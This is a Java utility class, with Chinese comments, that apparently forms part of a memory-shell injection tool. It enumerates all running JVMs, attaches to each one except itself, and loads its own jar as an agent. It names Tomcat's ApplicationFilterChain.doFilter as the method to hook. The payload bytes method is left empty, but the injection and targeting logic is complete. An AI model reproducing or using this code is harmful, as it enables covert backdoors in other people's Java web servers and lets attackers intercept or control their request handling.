package indi.augusttheodor;

import com.sun.tools.attach.*;
import sun.misc.Unsafe;

import java.io.File;
import java.io.IOException;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.List;

//这个工具类用来获取JVM并Attach
//如果有人看到这里，这里所使用的的com.sun.tools在java/libs/tools.jar内
//通过这个方式枚举JVM，是我见过的比较常用的方法 Java总是面面俱到，连埋自己的坟也提前挖好了
public class AttachA {

    public static void doAttach(String args) throws IOException, AgentLoadException, AgentInitializationException {
        //这个方法将自身注入所有JVM
        String jarPath = AttachA.class.getProtectionDomain().getCodeSource().getLocation().getFile();
        jarPath=new File(jarPath).getPath();
        List<VirtualMachineDescriptor> vList = VirtualMachine.list(); //获取JVM列表
        for(VirtualMachineDescriptor vmd:vList) {
            String vmdName = vmd.displayName();
            if (vmdName.contains(new File(jarPath).getName())) { //防止改名，这里用动态获取的名字
                continue; //排除自己
            }
            System.out.println("-------->附加到"+vmdName);
            try{
                VirtualMachine attachV = VirtualMachine.attach(vmd); //开始附加
                attachV.loadAgent(jarPath, args); //注入本jar到目标进程 然后它会调用agentmain
            }catch (AttachNotSupportedException e){
                System.out.println(vmdName+"----------------不支持Attach！");
            }catch (IOException e){
                System.out.println(vmdName+"----------------这个报错应该是因为进程已经被attach过一次");
            }

        }
    }

    

    public static HashMap<String,String[]> findAttachClasses(){
        //这个方法用于寻找注入目标
        //返回值为HashMap<ClassName,MethodName>
        //其实用HashMap不太严谨，但是这很方便
        HashMap<String,String[]> re=new HashMap<>();
        re.put("org.apache.catalina.core.ApplicationFilterChain", new String[]{"doFilter"});
        return re;
    }

    public static byte[] getRedefineClassBytes(){
        return new byte[0];
    }
}
